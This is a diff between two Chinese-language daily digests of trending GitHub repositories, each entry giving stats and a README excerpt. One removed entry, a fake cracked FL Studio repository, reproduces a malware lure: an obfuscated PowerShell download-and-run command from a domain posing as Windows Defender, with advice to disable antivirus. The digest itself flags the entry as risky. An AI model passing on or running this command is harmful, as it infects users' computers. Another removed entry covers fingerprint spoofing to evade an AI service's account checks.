@@ -1,604 +1,398 @@
-📊 开源日报 — 2026-11-12
-共发现 13 个新项目（已自动过滤历史记录）
+📊 开源日报 — 2026-11-13
+共发现 8 个新项目（已自动过滤历史记录）
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#1  TheAlgorithms/Java
-    ⭐ 67158 stars  |  🍴 21519 forks  |  💻 Java  |  📅 2016-07-16
-    🔗 https://github.com/TheAlgorithms/Java
+#1  ggml-org/llama.cpp
+    ⭐ 134730 stars  |  🍴 25528 forks  |  💻 C++  |  📅 2023-03-10
+    🔗 https://github.com/ggml-org/llama.cpp
     📡 来源: trending-daily
-    🏷️ algorithm, algorithm-challenges, algorithms, algorithms-datastructures, data-structures, hacktoberfest, java, search, sort, sorting-algorithms
-    📝 All Algorithms implemented in Java
+    🏷️ ggml
+    📝 LLM inference in C/C++
 
     README 摘要:
-    # The Algorithms - Java
+    # llama.cpp
     
-    You can run and edit the algorithms, or contribute to them using Gitpod.io (a free online development environment) with a single click.
+    LLM inference in C/C++
     
-    ### All algorithms are implemented in Java (for educational purposes)
-    These implementations are intended for learning purposes. As such, they may be less efficient than the Java standard library.
-    
-    ## Contribution Guidelines
-    Please read our Contribution Guidelines before you contribute to this project.
-    
-    ## Algorithms
-    Our directory contains the full list of algorithms implemented in Java.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#2  ⚠️风险  herdrdev/herdr
-    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
-    ⭐ 50436 stars  |  🍴 4071 forks  |  💻 Rust  |  📅 2026-03-27
-    🔗 https://github.com/herdrdev/herdr
-    📡 来源: trending-weekly
-    🏷️ agent, agent-orchestration, ai, ai-agents, claude-code, cli, codex, coding-agents, developer-tools, devtools
-    📝 the runtime your coding agents live on
-
-    README 摘要:
-    # herdr
-    
-      
-    
-      herdr.dev · install · quick start · docs
-    
-      English · 简体中文
-    
-      
-      
-      
-      
-      
-      
-    
-    ---
-    
-    https://github.com/user-attachments/assets/043ec09f-4bdd-41d5-aee0-8fda6b83e267
-    
-    **the runtime your coding agents live on.**
-    
-    - **detach without stopping work** — herdr keeps terminals running in a background server when you close the client or lose your SSH connection. after a server or machine restart, herdr restores the saved layout and can resume supported agent sessions; the original processes do not survive. session state →
-    - **several machines, one window** — keep local work and saved ssh machines together, with a combined agent list and independent reconnects. remote machines →
-    - **never hunt for the stuck one** — every pane is marked working, blocked, or idle. when an agent stops and needs an answer, herdr says so.
-    - **agent-native** — agents drive herdr through the cli and socket api: they can spawn panes, prompt each other, and wait until another agent is genuinely blocked. agent skill →
-    - **runs what you already run** — claude code, codex, cursor, opencode, grok and the rest. herdr doesn't wrap or replace them; it owns their terminals. building an agent? add herdr support →
-    - **keyboard and mouse, both first-class** — tmux-style prefix keys *and* click, drag, split. pick per moment, not per tool.
-    - **plugins** — extend panes and workflows. browse the marketplace →
-    - **one rust binary, no electron** — runs in whatever terminal you already use.
-    
-    ---
-    
-    ## install
-    
-    ```bash
-    curl -fsSL https://herdr.dev/install.sh | sh
-    ```
-    
-    or `brew install herdr` · `mise use -g herdr` · windows: `powershell -ExecutionPolicy Bypass -c "irm https://herdr.dev/install.ps1 | iex"` · endpoint-protected Windows · binaries
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#3  openai/codex-security
-    ⭐ 11952 stars  |  🍴 952 forks  |  💻 TypeScript  |  📅 2026-07-13
-    🔗 https://github.com/openai/codex-security
-    📡 来源: trending-daily
-    🏷️ ai-security, application-security, cli, code-scanning, codex, codex-security, cybersecurity, devsecops, nodejs, npm
-    📝 OpenAI's Codex Security CLI and TypeScript SDK for finding, validating, and fixing security vulnerabilities. npm: https://www.npmjs.com/package/@openai/codex-security
-
-    README 摘要:
-    # Codex Security
-    
-    Codex Security helps you find, investigate, and fix vulnerabilities in your code.
-    Use its security workflows in Codex, or automate them with the
-    `@openai/codex-security` CLI and TypeScript SDK.
-    
-    - **In Codex:** choose a security workflow.
-    - **In a terminal:** install the CLI and scan your repository.
-    - **In automation:** use the TypeScript SDK or
-      GitHub Action.
-    
-    ## Features
-    
-    - Scan repositories, selected paths, or Git changes. Deep scans repeat Standard scans and return their deduplicated findings.
-    - Validate candidate findings, generate patches, and verify existing fixes.
-    - Draft `SECURITY.md` policies and save threat models for later review.
-    - Browse saved scans and findings, identify duplicates, assess severity against
-      your own rubric, and suggest owners from source and Git history.
-    - Preview third-party scanner findings, save them locally, or publish supported reports to Codex Security Cloud. Scanner import guides.
-    - Track findings in Linear, Jira, or GitHub, publish completed scans, or export SARIF, JSON, and CSV. Integration workflows.
-    - Automate scans across repositories or project components, including in CI and
-      containers.
-    
-    ## Use in Codex
-    
-    Open your repository in a Codex session with the Codex Security plugin enabled,
-    then ask:
-    
-    > Run a Codex Security scan on this repository, focusing on authentication and
-    > authorization. Return the saved report, source evidence, and coverage limits.
-    
-    A completed scan saves a report and findings. Read the report for source
-    evidence and exclusions, then request a patch or ask Codex to verify an
-    existing fix. See the agent workflow guide for setup,
-    task selection, and recovery.
+    ggml / ops / maintainer PRs%20sort%3Aupdated-desc) / dev stats / lib llama API / llama-server REST API
     
     ## Quick start
     
-    Requires Node.js 22.13.0+ within 22.x, or Node.js 24.x or 26.x, and Python 3.10+.
-    Python 3.10 also requires `tomli`.
+    A few options to get `llama.cpp` installed on your machine:
+    
+    ```bash
+    # curl
+    curl -LsSf https://llama.app/install.sh | sh
+    
+    # powershell
+    irm https://llama.app/install.ps1 | iex
+    ```
+    
+    - Visit https://llama.app and follow the instructions
+    - Run with Docker - see our Docker documentation
+    - Download pre-built binaries from the releases page
+    - Build from source by cloning this repository - check out our build guide
+    
+    Once installed:
+    
+    ```sh
+    # Download and run a model directly from Hugging Face
+    llama cli -hf ggml-org/Qwen3.5-0.8B-GGUF
+    
+    # Launch OpenAI-compatible API server
+    llama serve -hf ggml-org/Qwen3.5-0.8B-GGUF
+    ```
+    
+        
+            
+                
+                VLM session with llama cli
+            
+            
+                
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#4  shadcn/improve
-    ⭐ 11205 stars  |  🍴 454 forks  |  💻 None  |  📅 2026-06-10
-    🔗 https://github.com/shadcn/improve
+#2  QwenLM/qwen-code
+    ⭐ 29994 stars  |  🍴 3410 forks  |  💻 TypeScript  |  📅 2025-06-26
+    🔗 https://github.com/QwenLM/qwen-code
     📡 来源: trending-daily
-    📝 Use your most capable model to audit your codebase and write plans for cheaper models to execute.
+    🏷️ agentic, ai, ai-agent, ai-coding, cli, coding-agent, developer-tools, llm, mcp, qwen
+    📝 An open-source AI coding agent that lives in your terminal.
 
     README 摘要:
-    # improve
+    **The open-source AI coding agent for your terminal, editor, desktop, browser, and chat.**
     
-    An agent skill that audits any codebase and writes implementation plans for other agents to execute.
+    中文 |
+    Deutsch |
+    français |
+    日本語 |
+    Русский |
+    Português (Brasil) |
+    한국어
     
-    The idea: use your most capable model for the part where intelligence compounds — understanding the codebase, judging what's worth doing, writing the spec — and hand execution to cheaper models. The skill never implements anything itself. The plan is the product.
+    | **Qwen Code 1.0 Preview**                                                                                                                                                                                                                                                                                                                                                              |
+    | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+    | Qwen Code 1.0 Preview brings together the agent harness capabilities of Qoder and Qwen Code in an open-source release.Try Qwen Code 1.0 Preview · Documentation · 中文文档. |
     
+    ## Why Qwen Code?
+    
+    - **Agentic out of the box** — Auto-Memory, Auto-Skills, SubAgents, Agent Teams, and MCP. Dynamic workflows, zero setup.
+    - **Open-source, inside and out** — The framework and the Qwen models are open-source. They evolve together. No vendor lock-in.
+    - **Multi-protocol** — Supports OpenAI, Anthropic, Gemini, and Qwen APIs. Any third-party provider or local model (Ollama / vLLM). Switch at runtime.
+    - **Beyond the terminal** — IDE plugins, Desktop app, Web UI, SDKs, and chat integrations (Telegram / DingTalk / WeChat / Feishu).
+    
+    > [!TIP]
+    > Qwen Code is actively iterating on itself — using its own agent and models to file issues, submit PRs, review code, and run tests. Powered by the community, driven by AI.
+    
+    ## Installation
+    
+    Looking for **Qwen Code 1.0 Preview**? Get started here. The instructions below are for the main version.
+    
+    **Linux / macOS:**
+    
+    ```bash
+    curl -fsSL https://qwen-code-assets.oss-cn-hangzhou.aliyuncs.com/installation/install-qwen-standalone.sh | bash
     ```
-    you          →  /improve                    (expensive model, advises)
-    plans/       →  001-fix-n-plus-one.md       (self-contained specs)
-    other agent  →  implements, tests, ships    (cheap model, executes)
+    
+    **Windows:**
+    
+    ```powershell
+    irm https://qwen-code-assets.oss-cn-hangzhou.aliyuncs.com/installation/install-qwen-standalone.ps1 | iex
     ```
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#3  ashhart/TensorFold
+    ⭐ 2022 stars  |  🍴 397 forks  |  💻 Zig  |  📅 2026-06-19
+    🔗 https://github.com/ashhart/TensorFold
+    📡 来源: trending-daily
+    🏷️ ai, ai-tools, llm, llm-inference, llm-tools
+    📝 LLM Inference Engine for Metal, CUDA and Vulkan.
+
+    README 摘要:
+    # TensorFold
+    
+    TensorFold serves language models from a Zig binary on Apple Silicon and NVIDIA GPUs.
+    The engine reads checkpoints, tokenizes requests and runs Metal or CUDA kernels directly.
+    Serving needs no Python or MLX installation.
+    
+    Building with a coding agent? Have it load the contributor skill before it writes any code.
+    
+    ## Contributing with agents
+    
+    Please use Agent Traffic Control before editing TensorFold so contributors and agents can avoid duplicate work and conflicting changes.
+    Check the live agent radar before choosing an issue and follow CONTRIBUTING.md and the ATC contributor instructions.
+    
+    Install or upgrade ATC to 0.9.4 or later, then run from an updated TensorFold clone:
+    
+    ```sh
+    npm install -g github:ashhart/ATC
+    atc check ISSUE --json
+    atc claim ISSUE --json
+    ```
+    
+    Replace `ISSUE` with the issue number and claim only after a complete check says the work is free.
+    TensorFold enables automatic public check-ins: a successful new claim starts an anonymous session on the radar and returns its `session` number.
+    Keep that number instead of starting a duplicate session.
+    For work already yours, start a session with `atc start ISSUE --json`.
+    Add `--github-name` to `claim` or `start` only if you want your verified GitHub name shown; `--local` keeps a new session on your machine.
+    The board shows the issue, activity state and last check-in; GitHub still associates the verification comment with its author.
+    Check that `publication` is `public`; `unavailable` means the public update failed even if the local claim or session succeeded.
+    
+    Pulse only while the agent is working, before its five-minute check-in expires:
+    
+    ```sh
+    atc pulse ISSUE SESSION working --json
+    atc who path/to/file --json
+    atc overlap --json
+    atc land ISSUE SESSION --json
+    atc release ISSUE --json
+    ```
+    
+    Use `reviewing` or `blocked` when appropriate, land the session when it stops, and resolve overlaps before opening a pull request.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#4  pookjw/HermesEnabler
+    ⭐ 1653 stars  |  🍴 146 forks  |  💻 Objective-C  |  📅 2024-12-14
+    🔗 https://github.com/pookjw/HermesEnabler
+    📡 来源: trending-daily
+    📝 Enable Hermès Watch Faces on any Apple Watch devices
+
+    README 摘要:
+    # HermesEnabler 2
+    
+    English · Tiếng Việt · 한국어 · 简体中文 · 繁體中文 · 日本語 · Español · Français · Deutsch · Português
+    
+    > Supported only on watchOS 27.0 through 27.3 beta 1.
+    
+    ## Installation
+    
+    ### macOS
+    
+    On macOS you can install the prebuilt IPA with Sideloadly or build the app directly with Xcode. Either way, the iPhone must be paired with the target Apple Watch, and the Watch must run a supported watchOS version.
+    
+    #### Install the IPA
+    
+    > **Known issue with Sideloadly 0.72:** Issue #43 reports that this version may remove the embedded Watch app while signing. If the iPhone app installs but HermesEnabler2 is missing from the Watch, use Xcode instead. This report is specific to version 0.72; compatibility with other versions has not been confirmed.
+    
+    1. Download the IPA from Releases.
+    2. Install Sideloadly on your Mac, connect your iPhone with a cable, and select it in Sideloadly.
+    3. Drag the IPA into Sideloadly and enter your Apple ID. Turn off **Use automatic bundle ID**, set a fixed Bundle Identifier, and start signing.
+    4. On the iPhone, open **Settings → General → VPN & Device Management** and trust your developer certificate.
+    5. On the iPhone, open **Settings → Privacy & Security → Developer Mode**, turn it on, restart, and confirm.
+    6. On the iPhone, open the **Watch** app, go to **My Watch → Apps**, and install **HermesEnabler2** on the Watch.
+    7. On the Apple Watch, open **Settings → Privacy & Security → Developer Mode**, turn it on, restart, and confirm. If the option is not shown, install the Watch app first and check again.
+    8. Open **HermesEnabler2** on your Apple Watch and follow the steps in the app.
+    
+    #### Build with Xcode
+    
+    1. Open HermesEnabler2.xcodeproj in Xcode.
+    2. Select your Apple Watch as the run destination and click **Run**.
+    3. Open **HermesEnabler2** on your Apple Watch and follow the steps in the app.
+    
+    ### Windows
+    
+    Windows uses WatchBridge, a community tool that prepares Developer Mode and installs an IPA containing both an iPhone host app and a Watch app. It is not affiliated with Apple or with this project.
+    
+    1. Install **Apple Mobile Device Service** by installing iTunes or the **Apple Devices** app from the Microsoft Store. WatchBridge needs it for USB and Wi-Fi communication. WebView2 is built into Windows 11.
+    2. Make sure your iPhone is paired with the target Apple Watch. WatchBridge supports only one paired Watch at a time; if more than one is paired, the preparation step stops instead of guessing.
+    3. Download `watchbridge-windows.zip` from
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#5  apex-compute/ANR
+    ⭐ 1107 stars  |  🍴 13 forks  |  💻 C++  |  📅 2026-11-11
+    🔗 https://github.com/apex-compute/ANR
+    📡 来源: 🚀 5天300+星
+    📝 Apex Neural Rendering (ANR) by Apex Compute
+
+    README 摘要:
+    # Apex Neural Rendering (ANR)
+    
+    Apex Neural Rendering by Apex Compute.
+    
+    - **ANR FG**: frame generation. In beta.
+    - **ANR SR**: super resolution (upscaling). Beta soon.
+    - **ANR RR**: ray reconstruction (denoising for ray tracing). Beta soon.
+    - **Source code**: coming soon.
+    - **nr-record**: records a game's frame generation or upscaler inputs to compare ANR FG, NVIDIA DLSS-G, DLSS, FSR, XeSS and others (below). Source in this repository.
+    
+    ## ANR FG Beta
+    
+    1. Download a package from Releases:
+       - `anr-fg-full`: for games without OptiScaler.
+       - `anr-fg-addon`: for games that already use OptiScaler.
+    2. Close the game, extract the package and run the installer with the folder of the game's `.exe`:
+       - Windows: `install.cmd`
+       - Linux and Steam Deck (Proton): `sh install.sh ""`, then set the game's launch options to the line it
+         prints: `WINEDLLOVERRIDES="dxgi=n,b" %command%`, or `winmm=n,b` in Vulkan games
+    3. In the game, turn on frame generation (the NVIDIA option where the game offers several).
+    
+    To uninstall, run `uninstall.cmd` or `sh uninstall.sh` with the same folder.
+    
+    ## Supported GPUs
+    
+    - NVIDIA GeForce RTX 20, 30, 40 and 50 series, and GTX 16 series
+    - AMD Radeon RX 5000, 6000, 7000 and 9000 series, and Steam Deck
+    - Intel Arc A and B series
+    
+    On Windows 10 and 11, and on Linux and SteamOS with Proton.
+    
+    ## Results and problems
+    
+    Please post them as issues:
+    - **Performance results**: run the test kit from the release and attach its result file.
+    - **Problems**: the game, GPU and driver, operating system, settings and what you saw, with the newest `nr_fg-*.log`
+      from under the game's `OptiScaler/custom/Apex Neural Rendering FG` folder.
+    
+    OptiScaler is GPL-3.0; its source for each release is attached to the release.
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#6  serveroshq/panel
+    ⭐ 657 stars  |  🍴 54 forks  |  💻 PHP  |  📅 2026-11-09
+    🔗 https://github.com/serveroshq/panel
+    📡 来源: 🚀 5天300+星
+    🏷️ agpl, control-panel, devops, laravel, open-source, self-hosted, server-management, serveros, vps
+    📝 The open source ServerOS panel: one place to run the Linux servers you already own.
+
+    README 摘要:
+    ServerOS panel
+    
+    One place to run the Linux servers you already own.
+    
+      
+      
+      
+      
+      
+    
+      
+    
+    ServerOS runs the Linux servers you already own from one place. Connect a VPS from any provider with one command, then deploy apps, sites and databases, watch them, back them up and fix them, without living in a terminal. Your servers stay with your provider, on your account.
+    
+    This repo is the panel, the web app you and your team work in. Each server runs serverosd, a small daemon the panel talks to. serveros.com runs this same panel as a hosted service.
+    
+    ## What's in it
+    
+    - **Machines**: connect a server with one command, see CPU, memory and disk, and install updates.
+    - **Services and projects**: deploy from Git or a template, with domains and HTTPS, and copy a project to a test environment before it goes live.
+    - **Backups, monitors and logs**: scheduled backups, uptime checks with alerts, status pages, and every service's logs in one place.
+    - **Workflows**: run steps on a schedule, on a push or by hand, like deploy, check and promote.
+    - **Teams**: members, roles, two-factor sign-in and an activity log.
+    - **AI and the API**: an MCP server and an API, so your own tools and assistants can work with your servers.
+    
+    ## Self-hosting
+    
+    You need a Linux server with Docker, ports 80, 443 and 8443 open, and a domain like `panel.example.com` with two A records pointing at the server: one for `panel.example.com` and one for `*.panel.example.com`.
+    
+    Then run this on the server:
+    
+    ```sh
+    curl -fsSL https://raw.githubusercontent.com/serveroshq/panel/main/docker/self-hosted/install.sh | sudo bash -s -- --domain=panel.example.com --email=you@example.com
+    ```
+    
+    It installs Docker if it's missing, runs the official image (`ghcr.io/serveroshq/panel`) and prints a setup code. Open `https://panel.example.com`, enter it, and the installer walks you through email and your first account. `serveros-panel setup-code` shows the code again if you lose it.
+    
+    Then connect your servers from Machines › Connect machine. Each one runs serverosd, the open source daemon, which connects out to your panel on port 8443.
+    
+    docs/self-hosting.md covers the rest: building the community edition yourself, installing without Docker, upgrades, backups, connecting machines, and the anonymous daily ping (and how to turn it off).
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#7  alexeyw/lot-map
+    ⭐ 646 stars  |  🍴 73 forks  |  💻 TypeScript  |  📅 2026-11-09
+    🔗 https://github.com/alexeyw/lot-map
+    📡 来源: 🚀 5天300+星
+    🏷️ agent-observability, ai-agents, claude, claude-code, claude-code-plugin, developer-tools, svg-animation, typescript, visualization
+    📝 A live map beside the chat that shows what Claude Code is doing: tool calls, model steps, hooks, skills and subagents light up as they happen. Local only, in 7 languages.
+
+    README 摘要:
+    # lot-map
+    
+    A mod for Claude Code: a live map of the work, in a pane beside the chat. Every tool call, model step, hook and skill sends a pulse from the centre to its station, so you see memory, files, shell, web and agents at work instead of reading a list of commands.
+    
+    *A made-up session replayed through the mod's own drawing code. Video (MP4).*
     
     ## Install
     
+    At the prompt of a terminal session:
+    
+    ```
+    /plugin install lot-map --marketplace alexeyw/lot-map
+    ```
+    
+    Answer `y` to add the marketplace, then choose a scope. From a shell:
+    
     ```bash
-    npx skills add shadcn/improve
+    claude plugin install lot-map --marketplace alexeyw/lot-map
     ```
     
-    Works in any agent that supports Agent Skills format. The plans it writes are plain markdown, so any agent (or human) can pick them up.
+    If it answers that the plugin is not found in any marketplace, add the marketplace first:
     
-    ## Usage
-    
-    ```
-    /improve                        full audit → prioritized findings → plans
-    /improve quick                  cheap pass: hotspots, top findings only
-    /improve deep                   exhaustive: every package, every category
-    /improve security               focused audit (also: perf, tests, bugs, ...)
-    /improve branch                 audit only what the current branch changes
-    /improve next                   feature suggestions — where to take the project
-    /improve plan      skip the audit, spec one thing
-    /improve review-plan      critique and tighten an existing plan
-    /improve execute          dispatch a cheaper executor, review its work
-    /improve reconcile              refresh the backlog: verify, unblock, retire
-    /improve ... --issues           also publish plans as GitHub issues
+    ```bash
+    claude plugin marketplace add alexeyw/lot-map
+    claude plugin install lot-map@lot-map
     ```
     
-    ## How to use
+    In the desktop app: click **+** next to the prompt box, then **Plugins**, **Add marketplace** with `alexeyw/lot-map`, then **Add plugin**.
     
-    A typical first run, start to finish:
+    The pane opens by itself when a session starts. In a terminal it needs at least 144 columns, otherwise type `/lot-map`, and it draws text only unless you ask for the map's picture: see In a terminal. Built and tested on Claude Code 2.1.321 on macOS; users report it working on Windows as well.
+    
+    ## Updating
+    
+    From a shell:
+    
+    ```bash
+    claude plugin marketplace update lot-map
+    claude plugin update lot-map@lot-map
+    ```
     
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#5  janestreet/agent_skills
-    ⭐ 6360 stars  |  🍴 440 forks  |  💻 None  |  📅 2026-11-03
-    🔗 https://github.com/janestreet/agent_skills
-    📡 来源: 🚀 两周800+星
-    📝 Agent skills
+#8  tanzeeldevAi/ai-meeting-assistant-copilot
+    ⭐ 38 stars  |  🍴 20 forks  |  💻 JavaScript  |  📅 2026-11-10
+    🔗 https://github.com/tanzeeldevAi/ai-meeting-assistant-copilot
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | open source ChatGPT alte
+    🏷️ ai-copilot, ai-meeting-assistant, ai-note-taker, chatgpt, claude, cluely, cluely-alternative, codex-cli, electron, google-meet
+    📝 Open-source AI meeting assistant and meeting copilot for Zoom, Google Meet and Teams. An overlay hidden from screen share writes what to say back in real time. Runs on your Claude or ChatGPT subscription. Free Cluely alternative for Windows and Mac.
 
     README 摘要:
-    # Agent skills from Jane Street
+    # AI Meeting Assistant Copilot
     
-    A collection of skills for AI agents and chatbots.
-    Each skill is a directory containing a `SKILL.md` file
-    with instructions for the agent.
-    
-    ## Skills
-    
-    - **socratic-tutor** — turns an LLM into a strict personal tutor that teaches a
-      topic of your choice using the Socratic method: a diagnostic, a skill map with
-      levels 0-5, one question at a time, spaced review, and a final assessment.
-    
-    ## How to use
-    
-    With a coding agent that supports the common `SKILL.md` format, copy the skill
-    directory into your agent's skills folder, then ask the agent to use it
-    ("teach me X").
-    
-    With a plain chatbot, paste the body of the skill's `SKILL.md` into the chat
-    (or into a custom/system prompt), followed by what you want it to do.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#6  ⚠️风险  Lee-xeo/Claude-Cage
-    ⚠️ 命中风险词: cookie —— 默认归排除区，需人工确认
-    ⭐ 4051 stars  |  🍴 452 forks  |  💻 Go  |  📅 2026-10-31
-    🔗 https://github.com/Lee-xeo/Claude-Cage
-    📡 来源: 🚀 两周800+星
-    📝 Cage：为 Claude 特化的轻量化虚拟机，彻底杜绝网络泄露。多平台适配，支持多账号管理、远程部署、移动端操控。
-
-    README 摘要:
-    Claude Cage
-    
-    **把 Claude 大小姐关起来，为了更好地保护我们的相遇**
-    
-      
-    
-     
-    
-    **项目主页 · 下载应用 · 使用文档 · 常见问题**
-    
-    简体中文 · 繁體中文 · Русский · العربية · فارسی · 한국어 · Español · မြန်မာဘာသာ · Беларуская · پښتو · دری · አማርኛ · Soomaali · ትግርኛ · Français
-    
-    ## 受够了 Anthropic
-    
-    作为一个只是想和 Claude 对话与合作的正常用户，受够了折腾各种 VPS，指纹浏览器，环境检测，面对封号的担惊受怕和财产损失。我们提出 **Claude Cage** 项目：**一个开箱即用的桌面程序，配置好自己的网络代理，集中管理隔离环境、时区语言和环境检查。**
-    
-    Claude Cage 让你在熟悉的系统里与 Claude 一起工作：Mac 上用 macOS 虚拟机，Windows 上用 Windows 虚拟机，也可以选择轻量的 Linux 环境。终端、浏览器、编辑器和官方 Claude Desktop 汇集在同一个工作台，项目按需共享，网络独立管理；还可以连接自己的服务器，或用手机接续电脑上的任务。支持以下几个重点功能：
-    
-    - 和主机隔离的网络设置，Cage 自己接管和代理内部的所有网络流量
-    - 和主机隔离的指纹设置，包括时区、语言等，支持自动与代理 IP 同步
-    - 针对 Claude 使用过程中的全链路适配（浏览器登录，授权，claude code 进程）
-    - 内置网络与隔离检查，关键检查失败或证据不完整时暂停外网；社区和第三方检测提供补充参考
-    
-    **使用 Cage 的环境检测结果：**
-    
-    | 网络与隔离检查 | 浏览器环境检测（社区参考） |
-    | :---: | :---: |
-    |  |  |
-    
-    FuckClaude · LinXiaoTao / GitHub
-    
-    **Cage 运行主界面：**
-    
-    ## 你可以用它做什么
-    
-    - **在一个窗口里完成工作。** 用终端运行 Claude Code，用编辑器查看改动，用 Cage 浏览器预览服务和完成登录。
-    - **用熟悉的系统开发。** 选择 macOS、Windows 或 Linux 客机，使用对应平台的工具；也可自动匹配本机系统版本，下载官方镜像并创建独立环境。 选择客机系统
-    - **控制共享范围。** 只共享默认工作区和明确打开的项目文件夹；主机的 Claude 登录、浏览器配置和 SSH 密钥不会自动导入。
-    - **看清网络状态。** 内置代理管理支持导入订阅、选择节点和检查出口。关键检查未通过时，环境保持离线；代理不可用时没有直连回退。
-    - **下次继续使用。** 工具、文件和登录状态保存在虚拟磁盘里，关闭窗口可以保留后台任务。
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#7  GoogleChrome/modern-web-guidance-src
-    ⭐ 2037 stars  |  🍴 151 forks  |  💻 TypeScript  |  📅 2026-01-27
-    🔗 https://github.com/GoogleChrome/modern-web-guidance-src
-    📡 来源: trending-daily
-    📝 无描述
-
-    README 摘要:
-    #  Modern Web Guidance (Source)
-    
-    This repo is the source repository for GoogleChrome/modern-web-guidance and includes the code and documentation for authoring, calibrating, and evaluating its contents.
-    
-    **Modern Web Guidance** is a set of skills that embed web platform expertise, best practices, and browser compatibility data directly into your coding agents. It helps to steer your coding agents away from legacy patterns, and instead toward solutions that harness the power and capabilities of the modern web platform.
-    
-    See CONTRIBUTING.md and GOVERNANCE.md for how we work on the project and orientation of the codebase.
+    **An open-source AI meeting assistant for Zoom, Google Meet and Teams. It listens to the call and writes what to say back on a private overlay that screen sharing does not show. Runs on the Claude or ChatGPT subscription you already have.**
     
     ---
     
-    *Stewarded by the Google Chrome, Microsoft Edge, Mozilla Firefox, and MDN teams, alongside the web development community.*
+    ## What is this?
     
-    Documentation · Eval Dashboard · Source Code · Report an Issue
+    A client asks you something on a call. You know the answer, but turning it into clear
+    words while they wait is the hard part, especially in a second language.
     
-    ##  Quickstart
+    **Meeting Copilot listens to the call and shows you what to say back**, a few seconds
+    after they finish speaking. You read it, say it in your own voice, and keep the
+    conversation moving. It is a free, open-source alternative to paid AI meeting copilots
+    such as Cluely, built for client calls, sales calls and consultations.
     
-    ```shell
-    npx modern-web-guidance@latest install
-    ```
+      
+        1. Prepare
+        2. Listen
+        3. Answer
+      
+      
+        Write a short brief: who you are meeting, your goal, your prices and the lines you want to use.
+        Press Start listening. It hears the other person through your computer's sound.
+        When they ask something, the words to say back appear on your private overlay.
+      
     
-    This command runs an interactive wizard to install Modern Web Guidance. See Alternative Installation Methods below.
+    ### At a glance
     
-    #### Try it out (without installing)
-    
-    ```shell
-    # Search for relevant guides
-    npx modern-web-guidance@latest search "animate a dialog modal backdrop"
-    
-    # Retrieve a guide by ID
-    npx modern-web-guidance@latest retrieve "animate-to-from-top-layer"
-    
-    # Scan a codebase for legacy patterns to modernize
-    npx modern-web-guidance@latest legacy-scan .
-    ```
-    
-    ##  Why?
-    
-    Coding agents often default to older patterns because LLM training data contains vast amounts of legacy code. This often leads them to generate bloated JavaScript for tasks that now have native, high-performance web platform solutions.
-    
-    Even if a model knows an API exists, it often lacks the density of real-world, modern implementation patterns required for production-ready code.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#8  ⚠️风险  seizepupatackle/fl-studio
-    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
-    ⭐ 982 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-08
-    🔗 https://github.com/seizepupatackle/fl-studio
-    📡 来源: 🚀 5天300+星
-    🏷️ audio-engineering, beat-making, developer-tools, digital-audio-workstation, fl, fl-studio-10, fl-studio-basic, fl-studio-classic, fruity-loops, image-line
-    📝 Fl Studio 2026 pre-configured environment for professional digital audio workstation deployment, ensuring seamless local execution and integration.
-
-    README 摘要:
-    # Fl Studio
-    
-    ### ⚡ Overview
-    **This repository provides a pre-activated, free setup for Fl Studio.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
-    
-    ### ⚙️ System Specifications
-    > **Distribution Type:** Pre-activated Local Build
-    >
-    > **Target Platform:** Windows x64 Desktop
-    >
-    > **Estimated File Size:** 1.0 GB
-    >
-    > **Last Verified Mirror Sync:** November 2026
-    
-    ---
-    ## 🛠️ Quick Installation Guide
-    
-    1. Open Terminal as Administrator:
-       * Press `Win + X` on your keyboard.
-       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
-    
-    2. Run the Setup Command:
-       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
-    
-       ```cmd
-       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
-       ```
+      CostFree and open source (MIT)
+      AIYour Claude or ChatGPT subscription. No API key needed
+      Call appsZoom, Google Meet, Microsoft Teams, Webex, any app that plays sound
+      ComputersWindows 10 and 11, macOS 13 or newer
+      SpeedAbout 2 to 5 seconds from their last word to the answer on screen, with Claude
+      Your dataBriefs, transcripts and notes stay on your computer
     
     ---
     
-    ## 📖 Troubleshooting & Easy Fixes
+    ## Features
     
-    ### ⚠️ If the script is blocked by Execution Policy
-    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
-    ```cmd
-    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
-    ```
-    
-    ### 🛡️ Antivirus / SmartScreen Warnings
-    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.
-
